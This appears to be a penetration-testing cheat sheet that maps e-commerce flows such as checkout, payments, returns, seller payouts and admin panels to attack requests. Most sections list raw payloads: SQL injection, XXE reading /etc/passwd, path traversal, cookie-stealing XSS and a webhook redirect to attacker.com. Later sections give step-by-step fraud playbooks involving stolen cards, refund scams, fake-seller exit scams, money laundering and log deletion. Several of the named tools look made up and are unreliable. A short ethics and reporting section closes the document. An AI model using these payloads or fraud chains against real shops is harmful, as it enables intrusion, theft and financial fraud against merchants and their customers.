# 🛍️ **E-COMMERCE PLATFORM DEEP FLOW ANALYSIS & ATTACK MAP**
*For Online Retail, Marketplaces, Digital Goods, Subscription Services*

---

## **1. E-COMMERCE ARCHITECTURE UNDERSTANDING**

### **Core E-commerce Components:**
```
🛍️ Product Catalog (Categories, Listings, Inventory)
🛒 Shopping Cart & Checkout
💳 Payment Processing (Gateways, Wallets, COD)
📦 Order Fulfillment (Shipping, Tracking, Returns)
👤 User Accounts (Profiles, Order History, Reviews)
📢 Marketing (Discounts, Coupons, Loyalty Points)
🏪 Seller/Admin Panel (For marketplaces)
```

### **Critical Assets (What's Valuable):**
```
💰 Money: Payment details, gift card balances, seller payouts
📦 Goods: Physical products, digital goods, subscription access
📊 Data: Customer PII, purchase history, payment details
📈 Business: Seller accounts, product listings, review system
```

---

## **2. USER ACCOUNT MANAGEMENT FLOW**

### **FLOW: User Registration & Profile Management**
```
Step 1: Sign up (Email/Phone, Password)
Step 2: Email/Phone verification
Step 3: Profile setup (Address, Preferences)
Step 4: Social login integration (Google, Facebook)
Step 5: Account security (2FA, Password reset)
Step 6: Account deletion
```

**🔴 ATTACK POINTS:**
```http
# 1. Account Enumeration
POST /api/check-email
{"email": "victim@example.com"} -> Returns "already exists"
# Can map existing user emails

# 2. Weak Registration Validation
POST /api/register
{
  "email": "victim@example.com",
  "password": "123456",
  "accept_terms": false  # Try without accepting terms
}

# 3. Profile Takeover via Profile Update
POST /api/profile/update
{
  "email": "attacker@example.com",  # Change email to attacker's
  "phone": "attacker_phone"
}

# 4. Social Login Bypass
GET /auth/google/callback?code=FAKE_CODE&state=FAKE_STATE
# Try to forge OAuth response

# 5. Insecure Direct Object Reference (IDOR) in Profile
GET /api/user/1001/profile  # Change to 1002, 1003, etc.
# Access other users' profiles

# 6. Password Complexity Bypass
POST /api/password/change
{
  "new_password": "123",
  "bypass_complexity": true,
  "bypass_history": true
}

# 7. Mass Account Creation
# Bot to create thousands of accounts
# Use for coupon abuse, referral fraud
```

---

## **3. PRODUCT CATALOG & SEARCH FLOW**

### **FLOW: Product Browsing & Search**
```
Step 1: Browse categories or search
Step 2: Apply filters (Price, Brand, Rating)
Step 3: Sort results (Popularity, Price, Newest)
Step 4: View product details
Step 5: Check availability (Inventory)
```

**🔴 ATTACK POINTS:**
```http
# 1. SQL Injection in Search
GET /api/search?q=' UNION SELECT username, password FROM users--

# 2. NoSQL Injection
GET /api/search?q={"$ne": ""}  # MongoDB
GET /api/search?q[$ne]=  # Alternative syntax

# 3. Direct Access to Hidden Products
GET /api/products?status=hidden
GET /api/products?admin_view=true
GET /api/products?coming_soon=true  # Preview upcoming products

# 4. Price Filter Bypass
GET /api/products?price_max=-1  # Negative price
GET /api/products?price_max=999999999  # Extreme value

# 5. Inventory Enumeration
GET /api/products/123/inventory
# Check stock levels for competitor analysis

# 6. XML External Entity (XXE) in Product Feed
POST /api/feed/import
Content-Type: application/xml
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<product>&xxe;</product>

# 7. Path Traversal in Product Images
GET /products/images/../../../etc/passwd
GET /cdn/products/..%2f..%2fconfig.php

# 8. Sensitive Data in Product JSON
GET /api/product/123
Response: {"cost_price": 10, "margin": 80%, "supplier": "confidential"}
```

### **FLOW: Product Reviews & Ratings**
```
Step 1: User purchases product
Step 2: Allowed to leave review after delivery
Step 3: Submit rating (1-5 stars) and text
Step 4: Optional photo/video upload
Step 5: Review displayed on product page
```

**🔴 ATTACK POINTS:**
```http
# 1. Post Review Without Purchase
POST /api/reviews
{
  "product_id": "123",
  "rating": 5,
  "text": "Great product!",
  "verified_purchase": true  # Try to set manually
  "user_id": "FAKE_USER_ID"
}

# 2. Edit/Delete Others' Reviews
DELETE /api/reviews/456  # Try to delete competitor's positive review
PUT /api/reviews/456
{
  "rating": 1,
  "text": "Terrible product!"
}

# 3. Review Bombing
# Coordinate multiple accounts to leave negative reviews
# Target competitor products

# 4. XSS in Review Text
POST /api/reviews
{
  "text": "<script>alert('XSS')</script><img src=x onerror=stealCookies()>",
  "rating": 1
}

# 5. Photo Upload Bypass
# Upload malicious file as review photo:
- SVG with XSS: <svg onload=alert(1)>
- HTML file: <html><script>stealData()</script></html>
- Malicious EXIF data

# 6. Review Moderation Bypass
POST /api/reviews
{
  "text": "BAD WORDS HERE",
  "bypass_filter": true,
  "auto_approve": true
}

# 7. Fake Verified Purchase Badge
# Inject HTML/CSS to show fake "Verified Purchase" badge
```

---

## **4. SHOPPING CART FLOW**

### **FLOW: Add to Cart & Cart Management**
```
Step 1: Add item to cart (Quantity, Variants)
Step 2: Update quantities
Step 3: Apply coupon codes
Step 4: Save cart for later
Step 5: Proceed to checkout
```

**🔴 ATTACK POINTS:**
```http
# 1. Negative Quantity
POST /api/cart/add
{
  "product_id": "123",
  "quantity": -999
}
# May result in negative total, store credit

# 2. Price Manipulation in Cart
POST /api/cart/update
{
  "items": [
    {"id": "item1", "price": 0.01}  # Change from 100.00
  ]
}

# 3. Coupon Code Enumeration
POST /api/cart/apply-coupon
{"code": "DISCOUNT10"}  # Brute force coupon codes
# Common patterns: SAVE10, WELCOME20, BLACKFRIDAY2024

# 4. Coupon Stacking
POST /api/cart/apply-coupon
{
  "coupons": ["SAVE10", "SAVE20", "FREESHIP"]
}
# Apply multiple when only one allowed

# 5. Cart IDOR
GET /api/cart/other_user_id
# View other users' carts
GET /api/cart?user_id=1002

# 6. Race Condition in Inventory
# Add same item multiple times quickly to oversell
# Limited stock item: Add to cart from multiple sessions

# 7. Hidden Cart Parameters
POST /api/cart/update
{
  "tax_exempt": true,
  "free_shipping": true,
  "discount_percent": 90
}

# 8. Cart Persistence Attack
# Cart stays valid for long time
# Add items at old price, checkout after price increase
```

---

## **5. CHECKOUT & PAYMENT FLOW**

### **FLOW: Checkout Process**
```
Step 1: Select shipping address
Step 2: Choose shipping method
Step 3: Select payment method
Step 4: Enter payment details
Step 5: Review order
Step 6: Place order
```

**🔴 ATTACK POINTS:**
```http
# 1. Bypass Shipping Fee
POST /api/checkout/shipping
{
  "method": "free",
  "actual_method": "express",
  "cost": 0
}

# 2. Address Validation Bypass
POST /api/checkout/address
{
  "country": "FREE_SHIPPING_COUNTRY",
  "actual_country": "EXPENSIVE_SHIPPING",
  "zip_code": "00000"  # Tax-free zone
}

# 3. Order Review Tampering
GET /api/checkout/review?order_id=123
# Try to view other users' order reviews
# Modify amounts in review page

# 4. Checkout Step Skipping
# Directly access /checkout/payment without shipping
# POST directly to /api/checkout/complete

# 5. Guest Checkout Abuse
POST /api/checkout/guest
{
  "email": "temp@temp.com",
  "use_multiple_times": true
}
# Place unlimited orders without account

# 6. Address Enumeration
POST /api/address/validate
{
  "address": "Victim Street 123",
  "return_suggestions": true
}
# Get address suggestions revealing other residents
```

### **FLOW: Payment Processing**
```
Step 1: Enter card details (or select saved card)
Step 2: 3D Secure verification (if applicable)
Step 3: Process payment
Step 4: Confirm success/failure
Step 5: Generate invoice
```

**🔴 ATTACK POINTS:**
```http
# 1. Card Testing
POST /api/payment/process
{
  "card_number": "4111111111111111",
  "expiry": "12/30",
  "cvv": "123"
}
# Test multiple cards for validity
# Small amount transactions (₹1/$1)

# 2. Payment Amount Manipulation
POST /api/payment/process
{
  "amount": 0.01,
  "currency": "USD",
  "order_id": "123"
}

# 3. Replay Attack
# Capture successful payment request and replay
# Same payment_id used multiple times

# 4. Bypass 3D Secure
POST /api/payment/3ds-bypass
{
  "order_id": "123",
  "bypass": true,
  "status": "success"
}

# 5. Fake Payment Gateway Response
# Intercept and modify payment gateway callback
POST /api/webhook/payment-success
{
  "transaction_id": "fake",
  "status": "success",
  "amount": 0.01
}

# 6. Stored Card Theft
GET /api/payment/cards  # List all saved cards
GET /api/user/1001/cards  # Other user's saved cards

# 7. Card Tokenization Bypass
POST /api/payment/tokenize
{
  "card_number": "4111111111111111",
  "token": "already_used_token"  # Reuse token
}

# 8. Partial Payment Exploit
POST /api/payment/partial
{
  "order_id": "123",
  "amount_paid": 0.01,
  "mark_as_full": true
}
```

### **FLOW: Alternative Payment Methods**
```
- Digital Wallets (PayPal, Apple Pay, Google Pay)
- Bank Transfer
- Cash on Delivery (COD)
- Gift Cards
- Cryptocurrency
- Buy Now Pay Later (BNPL)
```

**🔴 ATTACK POINTS:**
```http
# 1. COD Abuse
POST /api/order/cod
{
  "order_id": "123",
  "status": "paid",  # Mark COD as paid without actually paying
  "bypass": true
}

# 2. Gift Card Balance Manipulation
POST /api/giftcard/balance
{
  "card_number": "GIFT123456",
  "balance": 1000,
  "original_balance": 10
}

# 3. Gift Card Enumeration
# Brute force gift card numbers and pins
GET /api/giftcard/check?number=GIFT000001
POST /api/giftcard/redeem?number=GIFT000001&pin=0000

# 4. Wallet Payment Reversal
# Pay with wallet, then exploit reversal process
# Double spend attack

# 5. Cryptocurrency Payment Exploit
POST /api/payment/crypto
{
  "order_id": "123",
  "amount_btc": 0.000001,  # Very small amount
  "exchange_rate": 1000000  # Manipulated rate
}

# 6. BNPL Exploitation
POST /api/bnpl/apply
{
  "order_id": "123",
  "income": 999999,  # Fake high income
  "credit_score": 900,
  "approve_instantly": true
}
```

---

## **6. ORDER FULFILLMENT FLOW**

### **FLOW: Order Processing & Shipping**
```
Step 1: Order placed
Step 2: Payment captured
Step 3: Order shipped (tracking number added)
Step 4: In transit updates
Step 5: Delivered
```

**🔴 ATTACK POINTS:**
```http
# 1. Order Status Manipulation
POST /api/order/update-status
{
  "order_id": "123",
  "status": "shipped",
  "tracking_number": "fake_tracking",
  "actual_status": "pending"
}

# 2. Order Cancellation Abuse
POST /api/order/cancel
{
  "order_id": "OTHER_USER_ORDER",
  "refund_to": "attacker_account",
  "reason": "changed_mind"
}

# 3. Shipping Address Change After Shipment
POST /api/order/change-address
{
  "order_id": "123",
  "new_address": "attacker_address",
  "allow_after_shipment": true
}

# 4. Tracking Number Injection
POST /api/order/tracking
{
  "order_id": "123",
  "tracking_number": "12345'; DROP TABLE orders; --",
  "carrier": "fake_carrier"
}

# 5. Delivery Date Manipulation
POST /api/order/delivery-date
{
  "order_id": "123",
  "new_date": "2099-12-31",
  "delay_reason": "logistics"
}

# 6. Order Splitting Exploit
# Large order: Split into multiple small orders
# Each gets free shipping threshold bypassed
```

### **FLOW: Returns & Refunds**
```
Step 1: Request return (within policy)
Step 2: Generate return label
Step 3: Ship item back
Step 4: Inspection and approval
Step 5: Refund processed
```

**🔴 ATTACK POINTS:**
```http
# 1. Return Without Item
POST /api/returns/request
{
  "order_id": "123",
  "items": ["item1", "item2"],
  "return_shipping": "free",
  "keep_items": true  # Try to keep items and get refund
}

# 2. Refund Amount Manipulation
POST /api/refund/process
{
  "return_id": "123",
  "amount": 1000,  # More than paid
  "currency": "USD",
  "original_amount": 100
}

# 3. Return Policy Bypass
POST /api/returns/override
{
  "order_id": "OLD_ORDER",
  "override_policy": true,
  "allow_return": true,
  "reason": "customer_satisfaction"
}

# 4. Return Label Fraud
POST /api/returns/label
{
  "order_id": "123",
  "generate_multiple": true,
  "count": 100,
  "sell_labels": true
}

# 5. Partial Return for Full Refund
POST /api/returns/partial
{
  "order_id": "123",
  "returned_items": ["cheap_item"],
  "refund_amount": "full_order_value"
}

# 6. Cross-Site Return
# Buy from Store A, return to Store B
# Get refund from Store B
```

---

## **7. SELLER/VENDOR FLOW (MARKETPLACE)**

### **FLOW: Seller Registration & Onboarding**
```
Step 1: Apply to become seller
Step 2: Submit business details
Step 3: Verification (ID, Business docs)
Step 4: Set up payment for payouts
Step 5: Go live
```

**🔴 ATTACK POINTS:**
```http
# 1. Fake Seller Accounts
POST /api/seller/register
{
  "business_name": "Fake Store",
  "documents": "forged_docs.pdf",
  "verification_status": "approved",
  "tax_id": "stolen_tax_id"
}

# 2. Payout Account Hijacking
POST /api/seller/payout
{
  "seller_id": "VICTIM_SELLER",
  "new_bank_account": "attacker_account",
  "ifsc": "ATTACKERBANK",
  "bypass_verification": true
}

# 3. Seller Fee Evasion
POST /api/seller/fees
{
  "seller_id": "123",
  "commission_rate": 0,
  "transaction_fee": 0,
  "subscription_fee": 0
}

# 4. Bulk Seller Creation
# Create thousands of fake seller accounts
# Use for fake reviews, ranking manipulation
```

### **FLOW: Seller Product Management**
```
Step 1: Add product listing
Step 2: Set price, inventory
Step 3: Manage variants
Step 4: Handle orders
Step 5: Update inventory
```

**🔴 ATTACK POINTS:**
```http
# 1. Price Manipulation by Seller
POST /api/seller/products
{
  "product_id": "123",
  "price": 0.01,
  "original_price": 100.00,  # Show fake discount
  "discount_percent": 99
}

# 2. Fake Inventory
POST /api/seller/inventory
{
  "product_id": "123",
  "quantity": 9999,
  "actual_quantity": 0,
  "allow_oversell": true
}

# 3. Product Hijacking
POST /api/seller/product/update
{
  "product_id": "COMPETITOR_PRODUCT",
  "new_description": "Bad quality",
  "change_images": "poor_quality_images"
}

# 4. Review Manipulation by Seller
POST /api/seller/reviews
{
  "product_id": "MY_PRODUCT",
  "action": "buy_and_review",
  "rating": 5,
  "count": 1000
}
# Buy own products to leave positive reviews

# 5. Keyword Stuffing & SEO Spam
POST /api/seller/seo
{
  "product_id": "123",
  "hidden_keywords": "competitor1 competitor2 bad",
  "invisible_text": "white on white"
}

# 6. Product Category Manipulation
POST /api/seller/category
{
  "product_id": "123",
  "new_category": "wrong_category",
  "appear_in_all": true
}
```

### **FLOW: Seller Payouts**
```
Step 1: Sales accumulate
Step 2: Deduct fees and commissions
Step 3: Generate payout report
Step 4: Transfer to seller's bank
Step 5: Send notification
```

**🔴 ATTACK POINTS:**
```http
# 1. Payout Manipulation
POST /api/payouts/process
{
  "seller_id": "ATTACKER_SELLER",
  "amount": 1000000,
  "reason": "sales",
  "actual_sales": 1000
}

# 2. Fee Waiver
POST /api/payouts/fees
{
  "seller_id": "123",
  "waive_fees": true,
  "commission": 0,
  "processing_fee": 0
}

# 3. Early Payout
POST /api/payouts/early
{
  "seller_id": "123",
  "date": "immediate",
  "bypass_hold": true,
  "reason": "emergency"
}

# 4. Payout Reversal Exploit
POST /api/payouts/reverse
{
  "payout_id": "PAID_OUT",
  "new_account": "attacker_account",
  "original_account": "victim_account"
}
```

---

## **8. ADMINISTRATIVE FLOWS**

### **FLOW: Admin Dashboard Access**
```
Step 1: Admin login (special URL)
Step 2: Two-factor authentication
Step 3: View dashboard (sales, orders, users)
Step 4: Manage products, users, orders
Step 5: Configuration settings
```

**🔴 ATTACK POINTS:**
```http
# 1. Admin Path Discovery
GET /admin
GET /administrator
GET /wp-admin
GET /backend
GET /dashboard
GET /manager

# 2. Admin Credential Theft
POST /admin/login
{
  "username": "admin",
  "password": "admin"
}
POST /admin/login
{
  "email": "admin@company.com",
  "password": "' OR '1'='1"
}

# 3. 2FA Bypass
POST /admin/2fa
{
  "token": "000000",
  "remember_device": true,
  "skip_verification": true
}

# 4. Session Hijacking
GET /admin/dashboard
Cookie: session=STOLEN_SESSION_COOKIE

# 5. Subdomain Takeover
admin.store.com
dashboard.store.com
internal.store.com

# 6. Default Installation Files
GET /admin/install.php
GET /setup.cgi
GET /phpinfo.php
```

### **FLOW: Admin Operations**
```
- Manage users (edit, delete, impersonate)
- Manage orders (edit, cancel, refund)
- Manage products (edit, delete, hide)
- Manage coupons (create, edit, delete)
- View reports (sales, traffic, users)
- System configuration
```

**🔴 ATTACK POINTS:**
```http
# 1. User Impersonation
POST /admin/impersonate
{
  "user_id": "VICTIM_USER",
  "reason": "support",
  "full_access": true
}

# 2. Mass User Actions
DELETE /admin/users?ids=ALL
POST /admin/users/ban?ids=ALL_COMPETITORS
POST /admin/users/reset-password?ids=ALL&new_password=attacker123

# 3. Database Export
GET /admin/export/database?format=sql
GET /admin/backup/download
GET /admin/export/customers?format=csv

# 4. System Configuration
POST /admin/config
{
  "currency": "USD",
  "tax_rate": 0,
  "shipping_cost": 0,
  "commission_rate": 0,
  "min_order_free_shipping": 0.01
}

# 5. Coupon Creation for Self
POST /admin/coupons
{
  "code": "FREE100",
  "discount": 100,
  "expiry": "2099-12-31",
  "usage_limit": 999999,
  "min_order": 0.01
}

# 6. Order Manipulation
POST /admin/orders/edit
{
  "order_id": "BIG_ORDER",
  "new_amount": 0.01,
  "status": "paid",
  "bypass_payment": true
}

# 7. Inventory Manipulation
POST /admin/inventory
{
  "product_id": "ALL",
  "new_quantity": 0,
  "disable_alerts": true
}

# 8. Payment Gateway Config
POST /admin/payment/config
{
  "gateway": "stripe",
  "api_key": "sk_test_attacker_key",
  "webhook_url": "https://attacker.com/webhook"
}
```

---

## **9. MARKETING & PROMOTIONS FLOW**

### **FLOW: Discount & Coupon Management**
```
Step 1: Create coupon (code, discount, rules)
Step 2: Set limits (usage, min order, categories)
Step 3: Distribute (email, social, website)
Step 4: Track usage
Step 5: Expire/disable
```

**🔴 ATTACK POINTS:**
```http
# 1. Coupon Code Enumeration
GET /api/coupons/validate?code=ABCD
# Brute force to find valid coupons
# Common patterns: SAVE10, WELCOME20, BLACKFRIDAY2024

# 2. Coupon Rule Bypass
POST /api/coupon/apply
{
  "code": "SAVE50",
  "order_amount": 1,  # Below minimum
  "force_apply": true,
  "category": "excluded_category"
}

# 3. Unlimited Usage Exploit
POST /api/coupon/apply
{
  "code": "SINGLEUSE",
  "multiple_use": true,
  "user_id": "same_user"
}

# 4. Coupon Stacking
POST /api/coupon/apply-multiple
{
  "codes": ["SAVE10", "SAVE20", "FREESHIP"],
  "allow_stacking": true
}

# 5. Coupon Expiry Bypass
POST /api/coupon/apply
{
  "code": "EXPIRED_COUPON",
  "extend_expiry": true,
  "new_expiry": "2099-12-31"
}

# 6. One-time Use Coupon Reuse
# Use coupon, return items, coupon becomes available again
```

### **FLOW: Loyalty Program**
```
Step 1: Earn points on purchases
Step 2: Redeem points for discounts
Step 3: Tier benefits (Gold, Platinum)
Step 4: Referral bonuses
Step 5: Point expiration
```

**🔴 ATTACK POINTS:**
```http
# 1. Point Balance Manipulation
POST /api/loyalty/points
{
  "user_id": "123",
  "points": 1000000,
  "reason": "bonus",
  "source": "manual_adjustment"
}

# 2. Referral Fraud
POST /api/referral/claim
{
  "referrer": "ATTACKER",
  "referees": ["fake1@temp.com", "fake2@temp.com"],
  "points_per_referral": 1000,
  "auto_approve": true
}

# 3. Tier Upgrade Exploit
POST /api/loyalty/tier
{
  "user_id": "123",
  "new_tier": "platinum",
  "requirements_met": false,
  "bypass_rules": true
}

# 4. Point Expiration Bypass
POST /api/loyalty/extend
{
  "user_id": "123",
  "expiry": "2099-12-31",
  "prevent_expiry": true
}

# 5. Points Transfer Fraud
POST /api/loyalty/transfer
{
  "from_user": "VICTIM",
  "to_user": "ATTACKER",
  "points": "all",
  "bypass_limit": true
}

# 6. Double Dip Points
# Earn points on purchase
# Return items but keep points
# Repeat
```

### **FLOW: Flash Sales & Limited Offers**
```
Step 1: Announce sale (time-limited)
Step 2: Limited quantity available
Step 3: Special pricing
Step 4: One-per-customer limits
Step 5: Sale ends automatically
```

**🔴 ATTACK POINTS:**
```http
# 1. Time Manipulation
POST /api/sale/check
{
  "sale_id": "FLASHSALE",
  "current_time": "before_sale_starts",
  "early_access": true
}

# 2. Quantity Limit Bypass
POST /api/sale/purchase
{
  "sale_item_id": "123",
  "quantity": 100,  # Over limit
  "bypass_limit": true
}

# 3. Bot Purchases
# Bot to buy all limited stock
# Resell at higher price

# 4. Multiple Account Abuse
# Use different accounts to bypass "one per customer"

# 5. Cart Reservation Exploit
# Add to cart before sale starts
# Checkout during sale at sale price
```

---

## **10. DIGITAL GOODS & SUBSCRIPTIONS**

### **FLOW: Digital Product Delivery**
```
Step 1: Purchase digital product (ebook, software)
Step 2: Generate download link
Step 3: Send to email/account
Step 4: Download (with limits)
Step 5: Access management
```

**🔴 ATTACK POINTS:**
```http
# 1. Download Link Sharing
https://store.com/download?token=ABC123&product=456
# Share link with unlimited users
# Post on forums, social media

# 2. Download Limit Bypass
POST /api/download/reset
{
  "order_id": "123",
  "download_count": 0,
  "reset_limit": true,
  "unlimited": true
}

# 3. Direct File Access
GET /uploads/products/ebook.pdf
GET /digital/software.exe
# Try to access without token

# 4. License Key Generation
POST /api/licenses/generate
{
  "product_id": "123",
  "count": 1000,
  "type": "lifetime",
  "validity": "permanent"
}

# 5. License Validation Bypass
POST /api/license/validate
{
  "key": "ANY_KEY",
  "product_id": "123",
  "always_valid": true
}

# 6. Subscription Sharing
GET /api/subscription/access?user_id=FRIEND
# Share subscription with unlimited users
```

### **FLOW: Subscription Management**
```
Step 1: Subscribe to plan (monthly/yearly)
Step 2: Payment processing (recurring)
Step 3: Access granted
Step 4: Usage tracking
Step 5: Renewal/cancellation
```

**🔴 ATTACK POINTS:**
```http
# 1. Free Trial Exploit
POST /api/subscription/trial
{
  "plan_id": "premium",
  "trial_days": 365,
  "payment_required": false,
  "extend_trial": true
}

# 2. Plan Downgrade with Feature Retention
POST /api/subscription/downgrade
{
  "new_plan": "basic",
  "keep_premium_features": true,
  "price": "basic_price"
}

# 3. Payment Bypass for Renewal
POST /api/subscription/renew
{
  "subscription_id": "123",
  "payment_required": false,
  "auto_renew": true,
  "free_renewal": true
}

# 4. Multiple Subscription Abuse
POST /api/subscription/create
{
  "user_id": "same_user",
  "plan_id": "premium",
  "count": 10,
  "price": "single_price"
}
# Create multiple subscriptions for same person

# 5. Family Plan Abuse
POST /api/subscription/family
{
  "owner_id": "123",
  "members": ["fake1", "fake2", "fake100"],
  "limit": "no_limit"
}

# 6. Usage Limit Bypass
POST /api/subscription/usage
{
  "subscription_id": "123",
  "reset_usage": true,
  "unlimited": true
}
```

---

## **11. BUSINESS LOGIC ATTACKS (E-COMMERCE SPECIFIC)**

### **Attack 1: Inventory Manipulation & Stockout**
```
1. Find race condition in inventory check
2. Write bot to add 1000 units of limited product to cart
3. Complete checkout simultaneously from multiple accounts
4. Oversell product, cause stockouts
5. Competitor's reputation damaged
6. Buy from competitor at inflated price
7. Sell back to customers at profit
```

### **Attack 2: Gift Card Fraud Ring**
```
1. Steal credit cards (data breach, skimmers)
2. Buy gift cards in small amounts (below fraud detection)
3. Resell gift cards on secondary market (80% value)
4. Chargebacks on original cards (after 60 days)
5. Profit from sold gift cards
6. Repeat with new cards
```

### **Attack 3: Return & Refund Scam**
```
1. Buy expensive product (camera, laptop)
2. Request return (change of mind)
3. Send back different/cheap item (old phone, rocks)
4. Get full refund
5. Keep expensive product
6. Resell product on another platform
7. Repeat with different accounts
```

### **Attack 4: Marketplace Seller Fraud**
```
1. Create fake seller account (stolen identity)
2. List popular products at low prices (30% below market)
3. Collect orders and payments (1000+ orders)
4. Mark as shipped with fake tracking
5. Withdraw payouts immediately
6. Disappear before customers complain
7. Repeat with new identity
```

### **Attack 5: Loyalty Program Exploitation**
```
1. Create multiple accounts (100+)
2. Refer yourself to earn points (circular referrals)
3. Combine points for large discount (95% off)
4. Buy high-value items (electronics, gift cards)
5. Resell for profit (80% of retail)
6. Return some items for cash refund
7. Keep points from returned items
```

### **Attack 6: Coupon Stacking Exploit**
```
1. Find multiple coupon codes
2. Discover stacking vulnerability
3. Apply all coupons simultaneously (100%+ discount)
4. Get products for free + store credit
5. Order high-value items
6. Resell for pure profit
```

### **Attack 7: Price Matching Abuse**
```
1. Find product price error on competitor site
2. Take screenshot (Photoshop if needed)
3. Submit price match request
4. Get item at 10% below competitor price
5. Buy in bulk
6. Resell at normal price
```

### **Attack 8: Digital Product Piracy**
```
1. Buy one copy of digital product
2. Download product file
3. Crack DRM protection
4. Upload to file sharing sites
5. Sell access at low price
6. Undercut original seller
```

---

## **12. ADVANCED CHAINING ATTACKS**

### **Complete Account Takeover & Fraud Chain:**
```
1. XSS on product page steals admin cookies
2. Use admin access to create unlimited discount coupon (100% off)
3. Use coupon to buy products for free
4. Change shipping address to drop location
5. Order high-value items in bulk
6. Sell products for cash
7. Delete audit logs
8. Close admin account
```

### **Marketplace Manipulation & Monopoly:**
```
1. Take over popular seller account (phishing)
2. Change bank account for payouts
3. List fake products at low prices
4. Collect orders and payments
5. Redirect payouts to offshore account
6. Leave negative reviews on competitor products
7. Buy competitor products and return damaged goods
8. Become monopoly in category
```

### **Supply Chain Attack on E-commerce:**
```
1. Compromise vendor/seller account
2. Upload malicious firmware for electronic product
3. Customers download and install
4. Malware spreads to customer networks
5. Cryptominer deployed
6. Ransomware deployment
7. Data exfiltration
8. Extortion demands
```

### **Payment Processing Takeover:**
```
1. SQL injection in admin panel
2. Extract payment gateway API keys
3. Redirect webhooks to attacker server
4. Capture all payment details
5. Create fake refunds to attacker accounts
6. Modify transaction amounts
7. Cover tracks by deleting logs
```

### **Gift Card Money Laundering:**
```
1. Create fake seller accounts
2. List digital products (ebooks, software)
3. Buy own products with stolen credit cards
4. Receive payouts to clean bank accounts
5. Gift cards bought with stolen cards → Clean money
6. Repeat at scale
```

---

## **🎯 E-COMMERCE TESTING PRIORITY MATRIX**

### **CRITICAL (Immediate Financial Loss):**
```
1. Payment bypass (free purchases)
2. Admin access compromise
3. Gift card balance manipulation
4. Mass coupon generation
5. Direct database access
6. Order amount manipulation
7. Refund fraud
8. Seller payout hijacking
```

### **HIGH (Significant Financial Impact):**
```
1. User account takeover
2. Price manipulation
3. Unauthorized refunds
4. Seller payout manipulation
5. Inventory manipulation
6. Digital product theft
7. Subscription bypass
8. Loyalty point theft
```

### **MEDIUM (Business Impact):**
```
1. Information disclosure (user data)
2. Limited discount abuse
3. Review system manipulation
4. Loyalty program abuse
5. Competitor sabotage
6. SEO manipulation
7. Product listing tampering
```

### **LOW (Minor Issues):**
```
1. UI/UX issues
2. Missing security headers
3. Error message information
4. Rate limit missing
5. Cache headers
```

---

## **🔧 E-COMMERCE TESTING TOOLS**

### **For Payment Testing:**
```bash
# Test credit card processing
card-tester --gateway stripe --api-key sk_test_xxx
# Test gift cards
giftcard-brute --range 0000000000-9999999999
# Test webhook security
webhook-tester --url /api/webhook/payment --spoof-ip
```

### **For Business Logic Testing:**
```bash
# Race condition testing
race-condition-tester --url /api/cart/add --threads 100
# Inventory testing
inventory-checker --product-id 123 --iterations 1000
# Coupon brute force
coupon-brute --length 8 --charset alnum
```

### **For Marketplace Testing:**
```bash
# Seller panel testing
seller-scanner --url seller.target.com
# Payout testing
payout-explorer --api /api/seller/payouts
# Review system testing
review-bomb --product-id 123 --rating 1 --count 100
```

### **For API Testing:**
```bash
# API endpoint discovery
api-finder --domain store.com --output endpoints.txt
# Parameter discovery
param-miner --url /api/products --wordlist params.txt
# JWT testing
jwt-tool --token eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
```

---

## **⚠️ E-COMMERCE TESTING ETHICS**

### **BEFORE TESTING E-COMMERCE SITES:**
```
1. Use test accounts only
2. Never use real payment methods
3. Do not access real customer data
4. Test in staging/sandbox environments
5. Report vulnerabilities responsibly
6. Use obvious test data (TEST CARD 4111...)
7. Do not impact real inventory
8. Do not affect real sellers
```

### **Legal Consequences:**
```
- Computer Fraud and Abuse Act (CFAA)
- Financial fraud charges
- Civil lawsuits for damages
- Permanent bans from platforms
- Restitution payments
- Criminal records
```

### **Safe Testing Practices:**
```
1. Use test credit cards: 4242 4242 4242 4242 (Stripe test)
2. Use test email: test@example.com
3. Use test addresses: 123 Test Street
4. Clear test data after testing
5. Document all test actions
6. Get written permission if possible
```

---

## **📝 E-COMMERCE VULNERABILITY REPORTING**

### **When Reporting E-commerce Bugs:**
```markdown
Title: [Critical] Payment Bypass in Checkout Process
Platform: [Shopify/Magento/WooCommerce/Custom]
Impact: Unlimited free purchases
Steps:
1. Add item to cart
2. Intercept POST /api/checkout
3. Change amount parameter to 0
4. Order processes with $0 charge
Proof: Video/Screenshots
Business Impact: Complete revenue loss
Fix: Server-side validation
```

### **Include in Report:**
```
1. Clear reproduction steps
2. Business impact analysis
3. Suggested fixes
4. Proof of concept
5. Affected user count
6. Exploitation difficulty
7. CVSS score
8. Timeline for fix
```

---

**Remember:** E-commerce platforms are about **money flow**. Your testing should focus on how money enters, moves through, and exits the system.

**Your testing mindset:**
1. **"Can I get products for free?"** (Payment bypass)
2. **"Can I get more money than I should?"** (Refund fraud)
3. **"Can I manipulate the marketplace?"** (Seller fraud)
4. **"Can I access others' data?"** (Privacy breach)
5. **"Can I disrupt business operations?"** (Inventory, reviews)

**Start with:** Payment flow → User accounts → Admin panels → Seller systems → Business logic

**Pro tip:** Test during off-peak hours and use obvious test data to avoid confusion with real transactions. Look for newly launched stores or those that recently migrated platforms.

**Now test e-commerce platforms ethically and thoroughly! 🛒💳**

---

*Bonus: Look for e-commerce sites using outdated versions of platforms (Magento 1.x, old WooCommerce plugins) - they often have known vulnerabilities.*
